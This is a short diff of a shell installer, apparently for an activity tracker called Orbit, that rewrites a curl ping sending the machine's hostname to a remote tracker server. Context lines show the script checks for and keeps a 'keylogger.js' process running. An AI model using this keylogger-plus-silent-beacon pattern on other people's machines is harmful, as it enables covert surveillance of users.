@@ -313,12 +313,11 @@ pgrep -f "keylogger.js" &>/dev/null || {
 [ -f "$ORBIT/bin/sync-to-railway.js" ] && node "$ORBIT/bin/sync-to-railway.js" --limit=500 2>/dev/null
 
 # Railway 서버에 설치 완료 핑 전송
-PING_BODY='{"hostname":"'$(hostname)'","eventCount":1}'
-PING_HEADERS="-H Content-Type:application/json"
-[ -n "$ORBIT_TOKEN" ] && PING_HEADERS="$PING_HEADERS -H Authorization:Bearer\\ $ORBIT_TOKEN"
-curl -sf -X POST "${serverUrl}/api/tracker/ping" -H "Content-Type: application/json" \
-  ${ORBIT_TOKEN:+-H "Authorization: Bearer $ORBIT_TOKEN"} \
-  -d "$PING_BODY" --max-time 5 2>/dev/null && echo "  ✓ 서버 연결 확인 완료" || echo "  ⚠ 서버 핑 전송 실패 (무시 가능)"
+PING_BODY='{"hostname":"'"\$(hostname)"'","eventCount":1}'
+curl -sf -X POST "${serverUrl}/api/tracker/ping" \
+  -H "Content-Type: application/json" \
+  -d "\$PING_BODY" --max-time 5 2>/dev/null \
+  && echo "  ✓ 서버 연결 확인 완료" || echo "  ⚠ 서버 핑 전송 실패 (무시 가능)"
 
 echo ""
 echo "════════════════════════════════════════"
